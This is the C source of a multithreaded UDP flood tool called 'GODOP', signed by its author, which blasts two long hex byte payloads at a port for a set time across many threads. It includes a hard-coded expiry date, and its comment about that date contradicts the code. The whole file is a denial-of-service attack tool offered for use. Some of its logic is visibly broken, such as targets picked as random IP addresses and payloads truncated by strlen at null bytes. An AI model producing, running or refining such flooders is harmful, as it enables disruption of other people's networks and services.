#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

#define MAX_PAYLOADS 2 // Define a limit for payloads
#define IP_LENGTH 16   // Define IP string length

void usage() {
    printf("Usage: ./GODOP <PORT> <TIME> <THREADS>\n");
    exit(1);
}

struct thread_data {
    char ip[IP_LENGTH];
    int port;
    int duration;
};

// Generate a random IP address
void generate_random_ip(char *ip) {
    snprintf(ip, IP_LENGTH, "%d.%d.%d.%d",
             rand() % 256,
             rand() % 256,
             rand() % 256,
             rand() % 256);
}

// Worker function executed by each thread
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    const char *payloads[MAX_PAYLOADS] = {
        "\xc7\x78\xef\x6d\xc0\xc1\x4d\xfe\x50\xd4\xc7\xe1\xb4\x04\xfc\x61\x5b\x86\xcd\xf0\xa9\x2e\xa8\x3c\xd9\x5c\x06\x24\x22\x49\x05\xfc\x10\x5c\x82\x52\x7d\x42\x0d\x16\x53\xeb\x68\xf7\xd6\x69\x08\xe0\x74\x9b\x31\x68\xbd\xac\xd6\xe5\x3d\x0c\xda\x16\x66\xe7\x64\xc1\xad\xf5\xe7\x26\xe2\x1a\xcf\x9a\x79\x6a\xf3\x4f\x75\x10\x08\x04\x2e\x18\xb0\x41\xef\xbc\xe9\x1f\x70\x4c\xc4\xff\xbd\x2c\xff\x26\x1b\x57\x29\x9f\xdd\x16\x20\x54\x43\xee\xcc\x63\x64\x3d\xe9\x3e\x20\x45\x82\x16\xb6\x18\x1c\xe4\xbd\xf7\xd0\x15\xed\x10\x7e\x1e\xd8\xbf\x6a\x47\x32\xa3\xbc\x02\x1c\x70\x82\x66\xbd\x09\xce\x75\x8e\x7c\xf9\x8d\x1d\xec\xad\xe2\x6a\x34\x91\x58\x4e\x9b\x40\xe5\x95\xdf\xdc\x24\xfc\xc9\xc5\x36\x47\xd8\xde\xa4\xfc\x1c\x49\x38\xbe\xee\x5c\x89\xbc\x37\xb6\x5e\x97\x52\x41\x00\xee\xc9\xb4\x89\x48\xbd\x41\xd8\x78\xc6\x8c\x99\xe6\x1f\x2e\x66\xd8\xcb\x7d\xe1\x24\x74\xde\x0e\x44\x6d\x7b\xf6\x87\x5d\xe9\xec\x8a\x07\xf9\xd6\x1f\x31\x82\x78\x5c\x07\x6d\x70\x93\x24\x63\xe0\x4e\x86\x88\x20\x49\x7b\x54\x68\x41\x4b\x6f\x79\xbb\x7b\x04\xf3\x67\x87\x2f\xdd\xee\x3a\x32\x86\x59\xa7\x4a\x2c\xf0\x7a\x08\x99\x3d\x15\x06\x1d\x97\xe1\xf3\xe3\x52\xea\x9a\x64\x8d\x87\x54\xcd\x3f\x08\xf6\x4c\x51\x9b\xed\x86\xaf\xd3\x64\xc2\xa4\x09\xe3\x20\xdd\xaf\x08\xbd\xc2\xda\xd8\x7f\x71\xf2\xb3\x8e\x46\xdd\x7c\xbd\x03\x80\xd3\x7f\x94\xdb\xd1\x7b\x5e\x9c\xe5\x45\xef\xc6\x2e\x9f\xf5\x82\x7f\x80\xc8\xfd\x37\x9e\x87\x4d\x92\x26\x12\x27\x1b\x0b\x04\x8a\xf2\x04\x95\xe4\x56\xdb\x88\x82\xdc\x19\x24\x80\xcf\x6e\xb0\xf6\x74\x7f\x44\x29\x65\x31\x90\x4a\x14\xb4\x13\x79\x2d\x72\x13\xe0\xed\x83\x4e\x36\xfb\x89\xb2\x4e\x51\x21\x95\x35\x15\x61\xdf\xff\x60\xc8\xc7\xa0\x2a\xa2\xc5\x36\x13\x73\xb7\xbf\x3b\xae\xfd\x45\x11\xf5\xfb\x46\xb7\x56\xf1\xe9\x58\x73\x3c\xf3\x42\x7e\x60\xee\x63\x20\xa8\x15\xd8\xc7\xe9\xd8\x37\x9a\x96\x9f\xb3\x22\x34\x5e\x79\x2d\x1a\xe9\x66\xd0\x35\xcf\xb2\xd9\xdc\x80\xdb\xee\xe1\x8f\xfc\x07\x8e\x9f\x17\x7b\x97\x2e\xe7\xb9\x12\x12\x31\x7c\x8e\xeb\xc5\xce\xb4\x94\xe9\x70\x83\xcb\xbe\xd2\x15\x8e\xf0\x50\xef\x25\xa7\x26\x14\xf4\x9e\x00\x43\xed\xe0\x8c\xdc\x6d\xd5\x11\xb5\x98\x29\x89\xa1\xf0\x00\xde\x14\x79\xcb\xb2\xd2\x34\x2f\xe4\xca\xea\xe9\x45\x2f\x98\x0c\x63\xdc\x22\x51\x60\x01\x94\x97\x1e\x9b\x51\x2b\xee\x53\x99\x0a\xce\xf7\x21\xd1\x5e\xbb\x7a\x47\x2e\x66\x91\xc6\x7b\x39\x33\x7c\xdd\xfc\x00\x97\x12\x47\x29\x0c\x14\x0f\x7f\x7a\x63\xcf\x97\x1a\x2f\x5b\x7c\x8c\x23\x5d\xf0\x3f\xff\xd1\x98\xc5\x19\x25\xe8\x82\x52\x42\x2c\x74\x86\xdf\xe0\xac\xc2\x97\xec\x63\x83\x84\x2a\xc9\xa9\x2a\x60\x55\xea\x0a\x4c\x46\xf5\x5e\x2e\x8e\x53\x21\x1a\x92\x4f\xb5\x03\x85\xff\x9e\xd1\xac\x5e\xbd\x08\xfa\x16\x7e\xab\xc4\xc0\xad\x86\xbc\x6e\xbd\xe2\xfa\x4f\xcd\xe5\xb4\xa5\xb9\x13\xc9\x80\xd0\xc7\x34\xd5\x9a\x66\x1e\x76\xfb\x57\x2c\xb4\xc9\xab\x7a\x47\x98\x1f\x57\x0d\x56\xb2\xa3\x87\x80\xd5\xf4\x54\x8a\xba\x4f\xd4\x9b\x3e\x6b\x36\xa4\xaf\xd1\xc2\xc2\x9c\x02\x22\x84\x12\xd7\xb5\xfb\xec\xcd\x7a\xd7\x6f\x57\x33\xb4\xc4\x83\x60\x63\x09\xd0\xd3\x45\xbe\x74\xd1\xe8\xc5\x5b\x59\xfb\x60\x31\xac\x55\x82\xfc\xdc\x3e\x8e\x8f\xcf\x87\x1d\x16\xa6\x0c\x45\xf5\x6a\x11\xe0\x21\x16\xba\x4d\x28\x4f\x26\xc0\x89\xc5\xa1\x2f\xfb\x62\xe4\xda\xcc\x19\x70\x2a\x44\x1a\x8b\xc5\xa5\xaf\x4a\x65\x88\x42\xf5\xb2\x02\x13\xc4\x57\x25\xef\xdb\x04\xeb\x0c\x7d\x69\x8c\x9a\xf1\xa7\x8f\x32\x09\x74\xea\xa0\xab\xe2\xf6\xf7\x46\xe6\x1f\xaa\x3c\xe7\xa5\xb4\x58\xbd\x49\x66\x4d\x91\x8f\x76\x23\x34\x98\x03\xb4\x66\x88\x07\x89\x8b\xca\x4b\x32\xd9\x77\x7e\x0d\x17\x31\xbd\x10\xbf\x8a\x92\x9e\xb3\x83\x9f\x84\x4b\x90\xbe\x80\x5d\x67\x60\xba\x3b\xc0\xac\x32\x2d\xb5\x2f\x7d\x17\x97\x71\x07\xfb\xe8\xcd\xca\xee\xc1\x4b\xa5\xbe\xa3\x0c\x84\xc2\x26\xca\x6c\x64\x1b\x5e\x88\x94\xbb\x65\xd8\x2c\xc9\xf4\x4c\x9f\xff\x1c\xf6\x9c\xe8\xa1\x46\xe6\xd6\x02\x1c\xb2\xb5\xe9\x1d\xc7\x27\xc0\x75\xbf\xb1\xba\xac\xf6\xd2\xc2\x09\x83\x05\xc3\xb9\x73\x07\xa5\x24\x64\x91\x93\x12\x74\x24\x31\x60\x93\x4d\x9d\x0e\x6a\xec\x1b\xcf\x9c\x48\xb6\xfb\xae\x22\xd6\x87\xbf\x15\x76\xa5\x7b\xeb\xb0\x75\x2e\x24\x38\x27\x60\x27\x06\xea\x76\x79\x90\x04\xea\x48\x5e\xda\xb9\xd1\xf3\xfb\xe7\x49\x28\xc0\xe7\x5d\x5f\xca\xbb\x73\xe2\x2c\xc1\x34\x79\x42\x51\xce\x95\x43\xa9\x7c\x0c\x65\x1a\xd4\x64\x2d\x44\x58\x17\xd0\x3f\x5b\x84\x38\xf2\x04\x37\xbc\x90\x34\x3d\xa7\xcc\x2e\xbb\x89\x7b\xd1\xa0\x96\x27\x40\xe3\xee\xe0\xe2\xde\xdb\x5c\xc6\x42\xa9\x63\x3b\x45\x50\x00\x58\x40\x04\x9c\x6f\x5c\x96\x52\xef\x8c\xf3\xd1\x67\x03\x44\xbf\xce\xcf\x4e\xe4\xb6\x36\x16\x9e\x67\xd0\xc4\xe2\x80\x9d\x3d\x40\x9d\x37\x90\x80\x15\x7d\x37\xff\x6f\x61\x39\x4e\xc9\x79\xef\xee\xf7\x87\xc3\x86\x7c\xe6\xca\x8e\x43\x89\x55\xea\xf1\xcd\xc7\x35\x25\xb8\xe8\xd6\xb7\x44\xd8\xfc\xa1\xd8\x66\x89\x04\x60\x06\xae\xde\x8e\x12\xd8\x47\x6d\xb7\x10\xb8\xa9\x77\x04\x19\xe0\xeb\xf4\xa1\x4d\x3b\x8c\x16\x54\xf4\x42\x16\xf5\xd5\xfa\x50\x03\x14\x70\x88\x36\xb3\x08\x82\xdd\x20\x63\x81\xf9\xd5\xd8\x5a\x65\xa0\xd9\x4e\xa7\xb0\x7c\x09\x72\x1a\x7e\x26\x7b\x5b\xec\x02\x90\x4b\x78\x21\x63\xd3\x11\xb6\xdf\xea\x41\x05\x7e\x92\xb5\x53\x74\x72\x21\xea\x8f\xbf\xd3\x46\x0b\x44\x6d\xd5\x64\xe0\xdf\x4e\x83\x46\x7f\x12\x61\x40\x21\x8c\x9d\x52\x6b\x1b\xfe\x12\x32\x59\x44\x6d\x03\xd4\x8f\xfb\x5c\xca\x27\x5d\xb7\xac\xbc\x6d\x92\x0c\x38\x51\x47\x94\xfd\x23\xde\x9c\xa2\x51\x7b\x06\xe3\x38\x1b\xfb\x99\x5f\xcb\x29\x19\x73\x77\x6b\x1b\x68\xd8\x46\x0f\x04\x95\x69\xf8\x45\xe0\x13\x10\xf6\x17\x76\x57\x18\xd2\x45\xa7\x4f\x83\x4e\xa3\x70\x13\x2d\x73\x84\x69\x1b\x08\x15\x5e\xa1\x42\x4e\xfa\xbc\x0b\xe8\x92\xee\x68\xb1\xad\x22\x0b\x87\x41\xa0\x3d\x10\x86\x19\x9e\xf2\x23\x25\x38\xc3\xf3\xda\x22\xd8\xeb\xa5\x84\xf0\x57\xac\x94\x36\xef\xd2\x2b\x68\xd5\x0b\xfd\x3e\x1a\xac\xcc\x4c\xd3\x7d\x57\x6e\x8c\x79\x2f\x93\xc2\xfa\xe2\x79\x3a\xe8\xbf\xd5\x6c\x11\x74\x5f\xac\x9b\x76\xb3\xc9\xa4\x92\x00\x98\x18\x22\x3b\x51\x39\xc0\x88\x17\xa9\x0f\x13\x52\x7f\x47\x92\x7e\xcf\x5f\x00\xb1\x51\xa1\x11\x84\x21\x98\x17\xc7\x29\x1b\xb3\xdd\x81\x33\x17\xe1\x9e\x6b\x73\xb0\x2a\x22\xfd\xbc\xc1\xc6\x04\xf8\x6f\x35\x71\xa3\x4a\x02\x28\xe0\x40\x3f\x54\xad\xe1\xee\x82\x9f\xd0\xb3\xf0\x1a\x48\x48\xb9\x03\x8d\xe2\x1a\x74\x97\x79\x25\x65\x96\x57\xb4\x5f\x5f\x09\x06\x8a\xe3\x07\x82\xfb\x39\x2a\x9e\x51\x01\x14\x92\x9b\x58\xd4\xfe\x38\x7a\x6e\x89\xb0\x9d\x48\x63\xfa\x12\x95\xbe\x0a\xba\x8c\xb2\x4f\x03\x0a\x79\x60\x91\x78\xa6\xf9\x33\xc0\x94\x8e\x6d\x1e\xb1\xba\x6c\x29\xb5\x90\xd6\xed\x10\xe7\x7d\x83\x19\x99\x96\x04\xa4\xe1\xed\xda\xfe\x07\xc6\x82\x98\x79\x24\xd0\x15\x89\x70\xe4\x73\x29\x60\x50\x10\xdf\x65\x27\x80\xa9\x9c\xf6\x70\x65\xf4\xf1\xb5\xf3\x16\x81\x2f\xa3\x21\xe5\x38\x95\x9a\x03\x2a\xfb\xab\x80\x9c\x83\x3a\xef\xaf\xec\x45\xf6\x9a\x01\x5b\xb0\x19\xf0\x28\x27\x34\x86\xd6\xec\x93\xf2\xbb\xa8\xea\xb6\x0d\x32\x26\x37\xf9\xa4\xb9\xa6\xbb\xb6\x0e\x13\x19\xd4\xba\xf7\x35\x9a\xa4\xcd\x65\x78\x3f\x50\x45\x4c\xe6\xba\x15\xdd\x63\x1e\x1b\xb8\x63\xb2\x6f\x45\x89\x85\x10\xf0\x1d\xd3\x37\x0a\x79\x67\x41\xe9\x7f\x22\x63\x6c\xed\x72\x95\x4a\x94\x27\x33\x4d\xbe\xbf\x00\xb6\x62\xd4\xab\xc1\x90\x0b\x89\x07\xcb\x17\xbd\xc3\xd7\x94\xb6\x03\x7b\x39\xb0\x77\xd1\x50\x3e\xc8\xae\x4b\x38\xad\x65\xa2\x5c\xaa\xdf\x42\x61\x5b\xf9\x86\xac\x36\x3d\x31\xce\xb8\x3f\xd2\x33\x7d\xdd\x86\xfd\x47\xae\xad\xee\x79\xa7\xa3\x58\xdc\x02\xcd\x80\x32\x84\xca\x3c\xdf\xf4\x4b\xde\xdb\x73\xf2\xba\x17\x26\xb8\x35\xc8\x21\xd2\x93\xb9\x66\x44\x16\x6b\xc9\xf3\x22\x4a\x19\x47\x64\x37\xb8\xdb\xc4\x79\xd5\x6c\x1f\xee\x48\xda\x32\xd5\x5f\xa7\x06\x80\xa3\xca\xb7\x76\x70\xbb\x1a\xaa\xd2\x1c\x30\xb2\x7a\x20\x1f\x67\x4e\xe4\x69\xd5\xdf\xdd\xc4\x3e\x64\x6f\xd8\xd6\xce\xdc\xc6\x02\xf3\x84\xb9\xbe\x19\xa8\xbb\x87\xde\x1e\xda\xbf\xd1\xb2\x30\x3f\x2d\x8c\xec\x42\x22\x2d\xf0\x6f\x96\xb6\x77\x40\x17\x53\x94\x5d\xe1\xcc\x70\x73\x22\x9a\xdd\x59\x49\xe5\xd7\xef\x21\x85\xfb\x59\xc1\x5b\x88\xd8\x3f\xec\xe0\x84\x0f\xef\x40\x9d\xb6\xd8\x3a\x14\x0a\xcb\xed\xb3\x80\x09\x67\xb6\x88\xc8\x27\x16\x67\x52\x79\xa3\x54\xd5\x66\x8c\x65\x5c\x31\xaf\xf9\xfe\x96\x7f\x3f\x21\xae\x57\x7f\x1e\xf0\x4b\x02\x48\xec\x2c\x3b\xb4\x59\x06\x92\x12\x2d\x40\x9a\x10\xb0\x33\xb8\xcf\xbd\xa5\x19\xb5\xb4\x2d\x05\x3d\x68\x8d\x18\x78\x62\xbd\x9c\xb3\x61\xdb\x6d\x23\xad\x50\xc5\xea\xc3\x22\x31\x4b\xb5\x69\x02\xd0\x09\xd5\x40\x35\x09\x10\x21\x2b\x8f\x36\x35\xb8\xbf\xcb\xc5\x0f\xe5\x73\x43\xc6\x58\xfe\xeb\xe5\xc1\x59\xaa\x83\x5c\x75\xf7\x62\x48\x53\x9c",
        "\xc3\xe4\xcd\x85\x5c\x6f\x71\x47\x29\xbd\xe9\x98\xda\x3d\xc7\xca\x98\xab\x5f\xf6\x32\x53\xf2\x44\xa1\x2d\x89\xdf\x6e\xee\xd8\x82\xbd\x45\xcd\x0a\xfe\x56\x3e\x9c\x97\x40\xe2\x8b\x48\x6e\x47\xda\x9b\xde\x40\xce\xa0\xd7\xef\x7f\x74\xdb\x30\x4e\xf4\x04\xdd\x71\x4c\x95\x5f\x16\x44\xc9\xeb\xfc\xb1\x8f\x6a\x36\xd6\xe2\x3b\xf5\x18\x36\x16\x50\x51\x30\x5b\xfd\xd0\x6f\xf6\x1f\x77\xc4\x71\x4a\x69\x50\xf5\x71\x37\x0d\x76\xbf\x39\x7d\xff\x52\xc5\x0f\x83\x53\x45\x51\x57\xba\x3f\x56\xb3\xda\x5c\xe0\x17\x9e\x6c\x6c\xc8\x58\x82\x3e\x1c\x61\x62\xc8\x5e\x42\x40\x9b\x0b\xfc\x3e\x18\x49\x32\x8f\xba\xe3\xac\xcd\x95\x50\xec\xe4\x73\x98\xfc\xe9\x23\xba\x93\xa8\xc2\xdf\xa9\x0b\x6a\xea\x42\x37\x9b\x47\xf3\x54\x3f\x39\x5b\x0b\x91\x78\x8e\x38\x81\x2d\x9e\x22\x42\xa2\x68\x0d\xd3\xfe\xce\x34\x79\x15\xf4\x39\x0a\x0b\xdf\xb0\xec\x0a\x68\x22\xea\x4b\xd5\xd7\x0c\xea\xc9\xd3\x66\xb5\x97\x39\x84\x2a\x29\x67\x61\xdf\x44\xc0\x21\x56\x9a\x1d\x42\x96\x7b\x47\x7b\x24\x32\xdb\x1f\xaa\x48\xe7\x15\xf5\x6b\xc2\x06\xc2\x68\x32\x87\xad\x07\x83\x06\xed\xef\x53\xd5\x15\xc9\x6f\x94\x46\xd7\xe8\xc8\x50\x10\xb9\x83\x0a\x41\x1c\x9f\xb5\x22\x6d\xfe\xe3\xda\xd2\x3e\xf9\x3b\x72\x1a\x7b\x85\x56\x65\x34\xbb\x9e\x1c\xe6\x41\xba\xb9\x68\xde\xc2\xf3\xde\x83\xbf\x5c\xe2\x27\xbb\xf7\xd8\x7f\x9c\x00\x55\x54\xc4\x70\xd8\x5a\xdb\x3e\x5d\xf7\x9e\x9f\x63\xfd\x64\x06\x22\xdf\xe8\xd7\xe6\x29\x93\x5b\xa3\x4b\x70\x32\xe6\x78\x5f\x2c\xf5\xf8\xbf\x00\x0d\x48\x81\xc1\xca\xa0\x66\x48\x62\xa5\xa6\xa3\x70\x9a\x48\x8f\xf0\x4b\x77\x3b\x08\x49\x29\x93\xda\x5a\xd8\x9e\xf9\x78\x40\x55\x24\x72\x4d\xec\x47\xbf\xc6\xe3\x0d\x83\xaf\x9e\x10\x52\x53\x7c\xef\x2a\xf8\x1a\x1c\xa0\xa5\x77\x2c\xd7\xcd\x85\x7a\x1d\xd1\x93\xe0\x26\x48\xf6\x12\x55\xd6\xf5\xff\x79\xdc\xa6\x28\x4a\x96\xf7\x9e\x02\x43\x77\xab\x98\x10\x27\x77\x75\xff\xf6\xbc\xdd\x9d\x41\x68\xe0\x87\x12\x98\x06\xf1\x00\xfd\x2b\xa3\x2a\x89\xf7\xe2\x42\x00\x44\xc3\xc9\x31\x60\xd9\x9b\x7e\x94\x57\xcc\x67\xf1\x7d\xe1\xda\x0b\xe5\x9f\x1e\x2c\xb7\xc4\x7e\x5b\x7e\x0a\xc4\xfa\x43\xca\xc8\xea\x1c\x2c\x2c\xcc\xbf\xf5\x6c\x84\x57\x03\x96\x51\xfb\xc7\xf7\xee\x47\xb6\xf7\xd7\x01\xea\xe2\x1d\x06\xb6\x2c\xe2\x34\x2e\xd5\xcb\x0c"
    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->duration;

    printf("Thread targeting IP: %s\n", data->ip);

    while (time(NULL) <= endtime) {
        for (int i = 0; i < MAX_PAYLOADS; i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        usage();
    }

    int port = atoi(argv[1]);
    int duration = atoi(argv[2]);
    int threads = atoi(argv[3]);

    // Validate input parameters
    if (port <= 0 || port > 65535 || duration <= 0 || threads <= 0) {
        fprintf(stderr, "Invalid input: port must be 1-65535, duration and threads must be positive integers.\n");
        exit(1);
    }

    // Expiration time (e.g., January 31, 2025, 23:59:59)
    struct tm expiration_tm = {0};
    expiration_tm.tm_year = 2025 - 1900;
    expiration_tm.tm_mon = 0; // January
    expiration_tm.tm_mday = 25;
    expiration_tm.tm_hour = 23;
    expiration_tm.tm_min = 59;
    expiration_tm.tm_sec = 59;

    time_t expiration_time = mktime(&expiration_tm);

    if (expiration_time == -1) {
        perror("Error calculating expiration time");
        exit(1);
    }

    if (time(NULL) >= expiration_time) {
        printf("The program has expired. Exiting.\n");
        return 0;
    }

    srand(time(NULL)); // Initialize random seed

    printf("Flood started on port %d for %d seconds with %d threads\n", port, duration, threads);

    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    if (thread_ids == NULL) {
        perror("Memory allocation failed for thread IDs");
        exit(1);
    }

    struct thread_data *thread_data_array = malloc(threads * sizeof(struct thread_data));
    if (thread_data_array == NULL) {
        perror("Memory allocation failed for thread data");
        free(thread_ids);
        exit(1);
    }

    for (int i = 0; i < threads; i++) {
        // Generate thread-specific data
        generate_random_ip(thread_data_array[i].ip);
        thread_data_array[i].port = port;
        thread_data_array[i].duration = duration;

        // Launch thread
        if (pthread_create(&thread_ids[i], NULL, attack, &thread_data_array[i]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }

        printf("Launched thread %d targeting IP: %s\n", i + 1, thread_data_array[i].ip);
    }

    // Wait for all threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Clean up allocated resources
    free(thread_ids);
    free(thread_data_array);

    printf("Attack finished. Made By @GODxAloneBOY\n");
    return 0;
}
